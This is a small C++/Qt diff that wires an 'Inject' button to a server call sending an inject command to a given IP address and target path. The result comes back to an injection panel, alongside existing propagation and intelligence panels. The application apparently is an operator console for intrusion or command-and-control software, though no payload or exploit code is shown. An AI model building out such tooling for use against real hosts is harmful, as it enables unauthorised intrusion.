@@ -92,6 +92,13 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     });
     connect(m_propagationPanel, &PropagationPanel::statusMessage, this, &MainWindow::onStatusMessage);
 
+    // Injection: bridge Inject button → server, and server result → panel
+    connect(m_injectionPanel, &InjectionPanel::injectRequested, this, [this](const QString& ip, const QString& targetPath) {
+        m_server->sendInjectCommand(ip, targetPath);
+        onStatusMessage(QString("Injection sent: %1 → %2").arg(ip, targetPath));
+    });
+    connect(m_server, &Server::injectResultReceived, m_injectionPanel, &InjectionPanel::onInjectResult);
+
     // Connect Business Logic Service for real-time notification updates
     connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
 }
